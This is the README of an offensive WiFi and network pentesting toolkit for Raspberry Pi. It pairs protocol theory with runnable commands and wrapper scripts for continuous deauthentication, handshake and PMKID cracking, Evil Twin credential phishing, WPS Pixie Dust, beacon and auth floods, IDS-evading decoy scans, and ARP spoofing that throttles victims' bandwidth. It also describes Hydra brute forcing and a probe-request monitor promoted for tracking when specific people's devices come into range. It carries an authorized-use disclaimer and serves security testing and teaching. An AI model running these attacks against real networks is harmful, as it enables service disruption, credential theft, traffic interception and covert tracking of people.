# VoidPWN - Portable Pentesting Device

> **⚠️ DISCLAIMER:** This tool is for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before testing any network or system you don't own.

```
╦  ╦┌─┐┬┌┬┐╔═╗╦ ╦╔╗╔
╚╗╔╝│ ││││ ││╠═╝║║║║║║
 ╚╝ └─┘┴└─┘┴╩  ╚╩╝╝╚╝
═══════════════════════
Portable Pentesting Device
```

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [WiFi Attack Theory & Implementation](#wifi-attack-theory--implementation)
   - [Monitor Mode](#monitor-mode)
   - [Deauthentication Attack](#deauthentication-attack)
   - [WPA Handshake Capture](#wpa-handshake-capture)
   - [WPA Handshake Cracking](#wpa-handshake-cracking)
   - [PMKID Attack (Clientless)](#pmkid-attack-clientless)
   - [Evil Twin Attack](#evil-twin-attack)
   - [WPS Pixie Dust Attack](#wps-pixie-dust-attack)
   - [Beacon Flooding (MDK4)](#beacon-flooding-mdk4)
   - [Authentication Flooding (MDK4)](#authentication-flooding-mdk4)
4. [Network Reconnaissance Theory](#network-reconnaissance-theory)
   - [ARP Scanning](#arp-scanning)
   - [Port Scanning (Nmap)](#port-scanning-nmap)
   - [Stealth Scanning](#stealth-scanning)
   - [Vulnerability Scanning](#vulnerability-scanning)
   - [SMB Enumeration](#smb-enumeration)
   - [DNS Enumeration](#dns-enumeration)
   - [Web Enumeration](#web-enumeration)
5. [Man-in-the-Middle Attacks](#man-in-the-middle-attacks)
   - [ARP Spoofing](#arp-spoofing)
   - [Bandwidth Throttling](#bandwidth-throttling)
6. [Python Tools](#python-tools)
   - [Smart Scanner](#smart-scanner)
   - [Packet Visualizer](#packet-visualizer)
   - [WiFi Monitor](#wifi-monitor)
7. [Password Attacks](#password-attacks)
8. [Exploitation Tools](#exploitation-tools)
9. [Automated Attack Scenarios](#automated-attack-scenarios)
10. [Web Dashboard](#web-dashboard)
11. [Commands Reference](#commands-reference)

---

## Overview

VoidPWN is a comprehensive pentesting toolkit designed for portable deployment on Raspberry Pi devices with external WiFi adapters. It provides an interactive terminal-based menu system and a web-based dashboard for executing various offensive security operations.

### Key Capabilities:
- **WiFi Attacks**: Packet injection, deauthentication, handshake capture, PMKID attacks, Evil Twin
- **Network Reconnaissance**: Automated scanning, enumeration, vulnerability detection
- **MITM Attacks**: ARP spoofing, traffic interception, bandwidth throttling
- **Password Cracking**: Aircrack-ng, John the Ripper, Hashcat integration
- **Exploitation**: Metasploit, SQLMap, Responder, Bettercap

---

## Architecture

```
VoidPWN/
├── voidpwn.sh              # Main interactive menu (entry point)
├── scripts/
│   ├── core/               # System scripts (setup, LCD, diagnostics)
│   ├── network/            # Attack and recon scripts
│   │   ├── wifi_tools.sh   # WiFi attack automation
│   │   ├── recon.sh        # Network reconnaissance
│   │   ├── scenarios.sh    # Pre-configured attack workflows
│   │   └── wifi_throttle.sh # ARP spoofing + bandwidth limiting
│   └── python/             # Python-based tools
│       ├── smart_scan.py   # Intelligent auto-enumeration
│       ├── packet_visualizer.py  # Matrix-style traffic display
│       └── wifi_monitor.py # Probe request monitoring
├── dashboard/              # Web-based control interface
│   ├── server.py           # Flask API backend
│   ├── index.html          # Frontend UI
│   └── app.js              # Frontend JavaScript
└── output/                 # Captured data & logs
    ├── captures/           # WiFi handshakes, packets
    └── recon/              # Scan results
```

---

## WiFi Attack Theory & Implementation

### Monitor Mode

**Theory:**
Wireless network interface cards (NICs) typically operate in **managed mode**, where they only process packets destined for their MAC address. **Monitor mode** allows the NIC to capture ALL 802.11 frames in the air, regardless of destination—essential for wireless auditing.

**How it works:**
```bash
# The airmon-ng tool reconfigures the wireless interface
airmon-ng start wlan1     # Creates wlan1mon interface
```

**Implementation in VoidPWN:**
```bash
# wifi_tools.sh - enable_monitor_mode()
enable_monitor_mode() {
    # Kill interfering processes (NetworkManager, wpa_supplicant)
    airmon-ng check kill
    
    # Start monitor mode
    airmon-ng start "$INTERFACE"
    
    # Alternative manual method if airmon-ng fails:
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode monitor
    ifconfig "$INTERFACE" up
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --monitor-on   # Enable
sudo ./scripts/network/wifi_tools.sh --monitor-off  # Disable
```

---

### Deauthentication Attack

**Theory:**
802.11 management frames (including deauthentication frames) are **not authenticated** in WPA/WPA2. An attacker can forge deauth frames appearing to come from the Access Point, forcing clients to disconnect. This is used to:

1. **Capture WPA handshakes** - Force clients to reconnect and capture the 4-way handshake
2. **Denial of Service** - Prevent clients from connecting
3. **Force clients to Evil Twin** - Disconnect from legitimate AP, connect to rogue

**The 802.11 Deauth Frame Structure:**
```
┌─────────────────────────────────────────┐
│ Frame Control │ Duration │ DA │ SA │ BSSID │ Seq │ Reason Code │
└─────────────────────────────────────────┘
- DA: Destination Address (victim client or broadcast)
- SA: Source Address (spoofed AP MAC)
- BSSID: AP's MAC address
- Reason Code: 0x07 (Class 3 frame from non-associated station)
```

**Implementation:**
```bash
# wifi_tools.sh - deauth_attack()
deauth_attack() {
    local bssid="$1"      # Target AP MAC address
    local count="${2:-0}" # Number of deauth packets (0 = continuous)
    
    # -D: Skip AP detection (avoids errors with some cards)
    # --ignore-negative-one: Fixes channel -1 issues
    aireplay-ng --deauth "$count" -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
}
```

**Commands:**
```bash
# Send 10 deauth packets to specific AP
sudo ./scripts/network/wifi_tools.sh --deauth AA:BB:CC:DD:EE:FF 10

# Continuous deauth (DoS)
sudo ./scripts/network/wifi_tools.sh --deauth AA:BB:CC:DD:EE:FF 0
```

---

### WPA Handshake Capture

**Theory:**
WPA/WPA2 uses a **4-way handshake** to establish encryption keys:

```
Client                                AP
   │                                   │
   │◄────── ANonce (Authenticator Nonce)
   │                                   │
   │────── SNonce + MIC ──────────────►│  (Message 2)
   │                                   │
   │◄────── GTK + MIC                  │  (Message 3)
   │                                   │
   │────── ACK ───────────────────────►│  (Message 4)
```

The **Pairwise Transient Key (PTK)** is derived from:
```
PTK = PRF(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))

Where:
- PMK = PBKDF2(passphrase, SSID, 4096, 256)  # Pre-shared key derivation
- AA = AP MAC address
- SA = Client MAC address
- ANonce, SNonce = Random values from handshake
```

To crack the password, we need **Messages 1 & 2 (or 2 & 3)** from the handshake.

**Implementation:**
```bash
# wifi_tools.sh - capture_handshake()
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    
    # Lock interface to target channel
    iwconfig "$MONITOR_INTERFACE" channel "$channel"
    
    # Start capturing on target network
    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
    
    # Force client reconnection to capture handshake
    aireplay-ng --deauth 10 -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
}
```

**Commands:**
```bash
# Capture handshake from specific AP on channel 6
sudo ./scripts/network/wifi_tools.sh --handshake AA:BB:CC:DD:EE:FF 6
```

---

### WPA Handshake Cracking

**Theory:**
Once we have the 4-way handshake in a `.cap` file, we perform an **offline dictionary attack**:

1. Take a candidate password from wordlist
2. Compute `PMK = PBKDF2(password, SSID, 4096, 256)`
3. Compute PTK using PMK + handshake nonces + MAC addresses
4. Compute MIC (Message Integrity Code) from PTK
5. Compare computed MIC with captured MIC
6. If match → **password found**

**Speed bottleneck:** PBKDF2 requires 4096 SHA-1 iterations per password, making this CPU/GPU intensive.

**Implementation:**
```bash
# wifi_tools.sh - crack_handshake()
crack_handshake() {
    local cap_file="$1"
    local wordlist="${2:-/usr/share/wordlists/rockyou.txt}"
    
    aircrack-ng -w "$wordlist" "$cap_file"
}
```

**Alternative with Hashcat (GPU-accelerated):**
```bash
# Convert .cap to .hc22000 format
hcxpcapngtool -o hash.hc22000 capture.cap

# Crack with GPU
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --crack ~/captures/handshake-01.cap
```

---

### PMKID Attack (Clientless)

**Theory:**
Discovered in 2018, PMKID attack captures the **PMK Identifier** from the AP's **RSN IE** (Robust Security Network Information Element) in the first message of the handshake. This eliminates the need to wait for a client to connect.

**PMKID Calculation:**
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)
```

Since we know the PMKID, AP MAC, and our MAC, we can brute-force the PMK (derived from password).

**Advantages:**
- No clients needed on the network
- Works against WPA/WPA2-PSK networks
- Faster than traditional handshake capture

**Implementation:**
```bash
# wifi_tools.sh - pmkid_capture()
pmkid_capture() {
    local duration="${2:-300}"  # 5 minutes default
    
    # hcxdumptool captures PMKID from AP's beacon/probe responses
    timeout "$duration" hcxdumptool -o "$output_pcapng" -i "$interface" --enable_status=1
    
    # Convert to hashcat format
    hcxpcapngtool -o hash.hc22000 "$output_pcapng"
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --pmkid 300   # Capture for 5 minutes
```

---

### Evil Twin Attack

**Theory:**
An Evil Twin is a rogue Access Point that impersonates a legitimate network. The attack flow:

```
1. Clone legitimate AP's SSID
2. Broadcast fake AP on same or adjacent channel
3. Deauth clients from real AP
4. Clients connect to Evil Twin (stronger signal)
5. Attacker captures credentials or performs MITM
```

**Attack Variations:**
- **Captive Portal**: Present fake login page to capture credentials
- **SSL Stripping**: Downgrade HTTPS to HTTP
- **DNS Spoofing**: Redirect traffic to malicious servers

**Implementation:**
```bash
# wifi_tools.sh - evil_twin()
evil_twin() {
    local ssid="$1"
    local channel="${2:-6}"
    
    # Check for advanced tools
    if command -v wifiphisher &> /dev/null; then
        wifiphisher --essid "$ssid"  # Advanced captive portal attack
        return
    fi
    
    # Fallback: Basic soft AP with airbase-ng
    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --evil-twin "Free WiFi" 6
```

---

### WPS Pixie Dust Attack

**Theory:**
WPS (WiFi Protected Setup) has a vulnerability in the "External Registrar" mode. The **Pixie Dust attack** exploits weak random number generation in the **WPS exchange**.

The WPS protocol uses two random numbers (**E-S1** and **E-S2**) to protect the PIN. If these are predictable (weak RNG), we can derive the PIN without brute-forcing.

**Attack Process:**
```
1. Initiate WPS exchange with AP
2. Capture E-Hash1, E-Hash2, PKE, PKR
3. If E-S1/E-S2 are weak (predictable), solve offline
4. Recover WPS PIN → Get WPA passphrase
```

**Implementation:**
```bash
# wifi_tools.sh - wps_pixie_dust()
wps_pixie_dust() {
    local bssid="$1"
    
    # reaver with Pixie Dust mode (-K 1)
    reaver -i "$interface" -b "$bssid" -K 1 -vv
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --pixie AA:BB:CC:DD:EE:FF
```

---

### Beacon Flooding (MDK4)

**Theory:**
Access Points broadcast **beacon frames** (~10 per second) announcing their presence. MDK4 floods the airspace with thousands of fake beacon frames, causing:

- **Client confusion**: Devices see hundreds of fake networks
- **Network scanners overwhelmed**: Cannot find real networks
- **Denial of Service**: Some devices freeze trying to process beacons

**Implementation:**
```bash
# wifi_tools.sh - mdk4_beacon_flood()
mdk4_beacon_flood() {
    # Random SSIDs generated
    mdk4 "$interface" b
    
    # Or use custom SSID list
    mdk4 "$interface" b -f ssid_list.txt
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --beacon           # Random SSIDs
sudo ./scripts/network/wifi_tools.sh --beacon list.txt  # Custom list
```

---

### Authentication Flooding (MDK4)

**Theory:**
By sending thousands of fake **authentication requests** to an AP, we can exhaust its client table (Association ID pool), preventing legitimate clients from connecting.

**Implementation:**
```bash
# wifi_tools.sh - mdk4_auth_flood()
mdk4_auth_flood() {
    if [[ -n "$bssid" ]]; then
        mdk4 "$interface" a -a "$bssid"  # Target specific AP
    else
        mdk4 "$interface" a              # All APs in range
    fi
}
```

**Commands:**
```bash
sudo ./scripts/network/wifi_tools.sh --auth AA:BB:CC:DD:EE:FF
```

---

## Network Reconnaissance Theory

### ARP Scanning

**Theory:**
ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. Since ARP requests are broadcast on Layer 2, we can discover all hosts on a subnet by sending ARP requests to every IP.

**Advantages over ICMP ping:**
- Works even if ICMP is blocked by firewall
- Faster for local network discovery
- Reveals MAC addresses (useful for OS fingerprinting)

**Implementation:**
```bash
# recon.sh - arp_scan_network()
arp_scan_network() {
    local interface=$(ip route | grep default | awk '{print $5}')
    arp-scan --interface="$interface" --localnet
}
```

---

### Port Scanning (Nmap)

**Theory:**
Port scanning determines which TCP/UDP ports are open on a target. Nmap supports multiple scan types:

| Scan Type | Flag | Description |
|-----------|------|-------------|
| TCP Connect | `-sT` | Full TCP handshake (noisy, logged) |
| SYN Scan | `-sS` | Half-open scan (stealthier, requires root) |
| UDP Scan | `-sU` | UDP port discovery |
| NULL/FIN/Xmas | `-sN/-sF/-sX` | Evasion techniques |

**TCP SYN Scan (Half-Open) - How it works:**
```
Attacker         Target
   │                │
   │───SYN─────────►│
   │                │
   │◄──SYN/ACK──────│  (Port OPEN)
   │                │
   │───RST─────────►│  (Don't complete handshake)
```

If port is closed, target responds with RST. If filtered (firewall), no response.

**Implementation:**
```bash
# recon.sh - Scan types
quick_scan() {
    nmap -T4 -F --open "$target"           # Fast, top 100 ports
}

full_scan() {
    nmap -sV -sC -O -A -p- "$target"       # All 65535 ports, version detection
}

stealth_scan() {
    nmap -sS -T2 -f -D RND:10 "$target"    # SYN scan, slow, fragmented, decoys
}
```

---

### Stealth Scanning

**Theory:**
To evade IDS/IPS systems, we use several evasion techniques:

1. **Timing Control (`-T0` to `-T5`)**: Slower scans are harder to detect
2. **Fragmentation (`-f`)**: Split packets into tiny fragments
3. **Decoys (`-D RND:10`)**: Make scan appear to come from multiple IPs
4. **Data Padding (`--data-length 25`)**: Add random data to packets

**Implementation:**
```bash
# scenarios.sh - scenario_stealth_recon()
# Stealth SYN scan with all evasion techniques
nmap -sS -T2 -f --data-length 25 -D RND:10 "$target"
```

---

### Vulnerability Scanning

**Theory:**
Nmap's NSE (Nmap Scripting Engine) includes vulnerability detection scripts that:
- Check for known CVEs
- Test default credentials
- Identify misconfigurations

**Implementation:**
```bash
# recon.sh - vuln_scan()
nmap --script vuln "$target"
```

This runs scripts like:
- `smb-vuln-ms17-010` (EternalBlue)
- `ssl-heartbleed`
- `http-shellshock`

---

### SMB Enumeration

**Theory:**
SMB (Server Message Block) on port 445 often reveals:
- Shared folders
- User accounts
- Operating system version
- Domain information

**Implementation:**
```bash
# recon.sh - smb_enum()
smb_enum() {
    # Nmap SMB scripts
    nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery "$target"
    
    # Enum4linux - comprehensive enumeration
    enum4linux -a "$target"
    
    # List shares anonymously
    smbclient -L "$target" -N
}
```

---

### DNS Enumeration

**Theory:**
DNS provides valuable reconnaissance data:
- **A Records**: IP addresses
- **MX Records**: Mail servers
- **NS Records**: Nameservers
- **Zone Transfer (AXFR)**: Complete DNS database (if misconfigured)

**Implementation:**
```bash
# recon.sh - dns_enum()
dns_enum() {
    nslookup "$domain"           # Basic lookup
    dig "$domain" ANY            # All record types
    host "$domain"               # Reverse DNS
    dig axfr "@$domain" "$domain"  # Zone transfer attempt
}
```

---

### Web Enumeration

**Theory:**
Web enumeration discovers:
- Hidden directories/files
- Backup files (.bak, .old)
- Admin panels
- API endpoints

**Tools:**
- **Gobuster**: Fast directory brute-forcing
- **Nikto**: Web vulnerability scanner
- **WhatWeb**: Technology fingerprinting

**Implementation:**
```bash
# recon.sh - web_enum()
web_enum() {
    gobuster dir -u "$target" -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
}

# scenarios.sh includes full web hunting:
# - Gobuster for directories
# - WhatWeb for tech stack
# - Nikto for vulnerabilities
# - SQLmap for injection testing
```

---

## Man-in-the-Middle Attacks

### ARP Spoofing

**Theory:**
ARP has no authentication. An attacker can send gratuitous ARP replies claiming to be the gateway, causing victims to send all traffic through the attacker.

```
Before Attack:
Victim ───────────► Gateway ───────────► Internet

After ARP Spoof:
Victim ───────────► Attacker ───────────► Gateway ───────────► Internet
```

**ARP Poisoning Process:**
```
1. Tell Victim: "I am the Gateway" (attacker's MAC for gateway IP)
2. Tell Gateway: "I am the Victim" (attacker's MAC for victim IP)
3. Enable IP forwarding to relay traffic
4. Intercept/modify all traffic
```

**Implementation:**
```bash
# wifi_throttle.sh
enable_forwarding() {
    echo 1 > /proc/sys/net/ipv4/ip_forward  # Allow traffic forwarding
}

# Bidirectional ARP spoofing
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &   # Tell victim we're gateway
arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP &   # Tell gateway we're victim
```

---

### Bandwidth Throttling

**Theory:**
Once we're the MITM, we use Linux **Traffic Control (tc)** to rate-limit traffic:

**TC Architecture:**
```
                      ┌─────────┐
  Incoming Traffic ──►│  qdisc  │──► Outgoing Traffic
                      │  (HTB)  │
                      └────┬────┘
                           │
                      ┌────▼────┐
                      │  class  │  ← Rate limit applied here
                      │  (1:1)  │
                      └─────────┘
```

**Implementation:**
```bash
# wifi_throttle.sh
# Clear existing rules
tc qdisc del dev $INTERFACE root

# Add HTB (Hierarchical Token Bucket) qdisc
tc qdisc add dev $INTERFACE root handle 1: htb default 11

# Add class with bandwidth limit (e.g., 56kbit = dial-up speed)
tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 56kbit
tc class add dev $INTERFACE parent 1:1 classid 1:11 htb rate 56kbit
```

**Speed Options:**
- `56kbit` - Dial-up (extremely slow)
- `256kbit` - Images load slowly
- `1mbit` - YouTube buffers

**Commands:**
```bash
sudo ./scripts/network/wifi_throttle.sh
# Then select target and speed interactively
```

---

## Python Tools

### Smart Scanner

**Theory:**
Automated enumeration that chains tools based on discovered services:

```
Port Found → Service Identified → Run Specific Attacks
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   80/443  → HTTP/HTTPS          → Nikto + Gobuster
   445     → SMB                  → SMB vuln scripts + enum4linux
   22      → SSH                  → Algorithm audit
```

**Implementation (smart_scan.py):**
```python
def scan_target(target, output_dir):
    # Phase 1: Fast port discovery
    nmap_cmd = f"nmap -T4 -F {target}"
    open_ports = parse_results()
    
    # Phase 2: Service version detection
    nmap_cmd = f"nmap -sV -sC -p {ports} {target}"
    
    # Phase 3: Targeted attacks based on services
    if '80' in open_ports or '443' in open_ports:
        run_nikto(target)
        run_gobuster(target)
    
    if '445' in open_ports:
        run_smb_vuln_scan(target)
        run_enum4linux(target)
    
    if '22' in open_ports:
        run_ssh_audit(target)
```

---

### Packet Visualizer

**Theory:**
Uses Scapy to capture and display network packets in a "Matrix-style" terminal UI. Captures TCP, UDP, ICMP traffic and displays source/destination with port information.

**Implementation (packet_visualizer.py):**
```python
from scapy.all import sniff, IP, TCP, UDP, ICMP

def process_packet(packet):
    if TCP in packet:
        info = f"TCP {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}"
    elif UDP in packet:
        info = f"UDP {packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}"
    # Display with curses for terminal UI

sniff(filter="not port 22", prn=process_packet) # Exclude SSH to avoid loops
```

---

### WiFi Monitor

**Theory:**
Monitors **802.11 Probe Requests** - frames sent by devices searching for known networks. Reveals:
- Device MAC addresses
- Networks the device has connected to before
- Device presence/proximity

**Use Cases:**
- Track when specific devices enter range
- Identify what networks people connect to
- Device inventory

**Implementation (wifi_monitor.py):**
```python
from scapy.all import sniff, Dot11ProbeReq

WATCHLIST = {}  # MAC -> Name mapping for alerts

def packet_callback(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        mac = pkt.addr2
        ssid = pkt.info.decode('utf-8') if pkt.info else "Hidden"
        rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
        
        if mac.lower() in WATCHLIST:
            print(f"ALERT: {WATCHLIST[mac]} detected! Searching for '{ssid}'")
        else:
            print(f"New Device: {mac} searching for '{ssid}'")

sniff(iface="wlan1mon", prn=packet_callback)
```

---

## Password Attacks

### Integrated Tools

**Hydra** - Online brute-force:
```bash
# SSH brute force
hydra -l admin -P wordlist.txt ssh://192.168.1.1

# FTP brute force
hydra -l admin -P wordlist.txt ftp://192.168.1.1

# HTTP POST form
hydra -l admin -P wordlist.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'
```

**John the Ripper** - Offline hash cracking:
```bash
john hashfile --wordlist=/usr/share/wordlists/rockyou.txt
```

**Hashcat** - GPU-accelerated cracking:
```bash
hashcat -m 0 -a 0 hashes.txt wordlist.txt  # MD5
hashcat -m 22000 hash.hc22000 wordlist.txt # WPA
```

---

## Exploitation Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **Metasploit** | Exploitation framework | `msfconsole` |
| **SQLMap** | Automated SQL injection | `sqlmap -u URL --batch` |
| **Responder** | LLMNR/NBT-NS poisoning | `sudo responder -I eth0` |
| **Bettercap** | Network MITM framework | `sudo bettercap` |

---

## Automated Attack Scenarios

Pre-configured workflows in `scenarios.sh`:

### Scenario 1: WiFi Audit
Complete wireless assessment:
1. Scan all networks (duration-based)
2. Capture handshakes
3. Attempt WPS attacks
4. Generate report

### Scenario 2: Network Sweep
Full network discovery:
1. Host discovery (nmap -sn)
2. All-port scan
3. Vulnerability scan
4. OS detection

### Scenario 3: Web Application Hunt
1. Find web servers (80, 443, 8080, 8443)
2. Directory enumeration (Gobuster)
3. Technology detection (WhatWeb)
4. Nikto vulnerability scan
5. SQL injection testing (SQLMap)

### Scenario 4: Stealth Reconnaissance
Low-profile intelligence gathering:
- T1-T2 timing (Sneaky/Slow)
- Packet fragmentation
- 10 decoy IPs
- Safe scripts only

### Scenario 5: Quick Assessment
5-10 minute security check:
1. Fast host discovery
2. Top 1000 ports
3. Quick vuln check
4. Risk assessment

---

## Web Dashboard

Flask-based control interface (`dashboard/server.py`) providing:

**API Endpoints:**
| Endpoint | Function |
|----------|----------|
| `/api/system` | CPU, memory, temperature stats |
| `/api/stats` | Attack statistics (handshakes, hosts, vulns) |
| `/api/scan/start` | Initiate WiFi scan |
| `/api/scan/results` | Get discovered networks |
| `/api/action/deauth` | Execute deauth attack |
| `/api/devices/list` | Discovered device inventory |
| `/api/logs/live` | Real-time attack logs |

**Features:**
- Real-time system monitoring
- Device inventory management
- One-click attack execution
- Live log streaming
- Report generation

**Start Dashboard:**
```bash
./scripts/core/dashboard.sh start
# Access at http://<device-ip>:5000
```

---

## Commands Reference

### WiFi Tools
```bash
sudo ./scripts/network/wifi_tools.sh --scan              # Scan networks
sudo ./scripts/network/wifi_tools.sh --handshake BSSID CH # Capture handshake
sudo ./scripts/network/wifi_tools.sh --deauth BSSID 0    # Continuous deauth
sudo ./scripts/network/wifi_tools.sh --evil-twin SSID CH # Evil Twin AP
sudo ./scripts/network/wifi_tools.sh --crack file.cap    # Crack handshake
sudo ./scripts/network/wifi_tools.sh --pmkid 300         # PMKID capture
sudo ./scripts/network/wifi_tools.sh --pixie BSSID       # WPS Pixie Dust
sudo ./scripts/network/wifi_tools.sh --beacon            # Beacon flood
sudo ./scripts/network/wifi_tools.sh --auth BSSID        # Auth flood
```

### Reconnaissance
```bash
sudo ./scripts/network/recon.sh --quick 192.168.1.0/24   # Fast scan
sudo ./scripts/network/recon.sh --full 192.168.1.100     # Full port scan
sudo ./scripts/network/recon.sh --stealth 192.168.1.100  # Stealth scan
sudo ./scripts/network/recon.sh --vuln 192.168.1.100     # Vuln scan
sudo ./scripts/network/recon.sh --smb 192.168.1.100      # SMB enum
sudo ./scripts/network/recon.sh --dns example.com        # DNS enum
sudo ./scripts/network/recon.sh --web http://target      # Web enum
sudo ./scripts/network/recon.sh --discover               # Network discovery
sudo ./scripts/network/recon.sh --comprehensive TARGET   # Full assessment
```

### Python Tools
```bash
sudo python3 scripts/python/smart_scan.py TARGET         # Smart enumeration
sudo python3 scripts/python/packet_visualizer.py         # Traffic monitor
sudo python3 scripts/python/wifi_monitor.py wlan1mon     # Probe monitor
```

### Bandwidth Throttle
```bash
sudo ./scripts/network/wifi_throttle.sh                  # Interactive MITM
```

---

## Legal Notice

This tool is provided for **authorized penetration testing** and **educational purposes** only. Unauthorized access to computer systems is a criminal offense under laws including:

- **USA**: Computer Fraud and Abuse Act (CFAA)
- **UK**: Computer Misuse Act 1990
- **EU**: Directive on attacks against information systems

**Always obtain written authorization before testing any network or system.**

---

